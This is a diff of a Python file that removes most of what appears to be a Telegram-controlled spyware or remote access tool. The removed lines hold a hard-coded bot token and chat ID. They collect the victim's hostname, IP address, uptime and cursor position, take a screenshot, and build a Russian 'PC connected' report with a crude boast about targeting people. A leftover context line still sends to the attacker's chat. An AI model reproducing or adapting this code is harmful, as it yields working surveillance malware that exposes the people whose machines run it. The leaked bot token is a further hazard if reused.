@@ -1,39 +1,4 @@
 
-token = '7425370006:AAEGvsHtwekZyePZDCq6Ik6Wlb4mSlMBKyI'
-bot = telebot.TeleBot(token)
-chat_id = 1882056354
-telegram_bot_token = "7425370006:AAEGvsHtwekZyePZDCq6Ik6Wlb4mSlMBKyI"
-chat_ids = (1882056354,)
-code_to_execute = ''
-current_program = os.path.abspath(__file__)
-
-# инфомо пк:
-boot_time_timestamp = psutil.boot_time()
-boot_time = datetime.fromtimestamp(boot_time_timestamp)
-current_time = datetime.now()
-uptime = current_time - boot_time
-# Получаем информацию о системе
-hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
-system_name = platform.system()
-position = pyautogui.position()
-screenshot = pyautogui.screenshot()
-screenshot.save('screenshot.png')
-
-# Сообщение для отправки
-message = f"""
-Подключен ПК:
-
-- Название системы: {system_name}
-- Айпи: {ip_address}
-- Время работы ПК: {uptime}
-- Время запуска программы: {datetime.now()}
-- Местоположение: {position}
-
-Время ебашить мудаков братиш)
-
-by --------\MRAKS/---------
-"""
 
 # Отправка сообщения в chat_id
 chat_id = 1882056354 # Замените на ваш чат ID
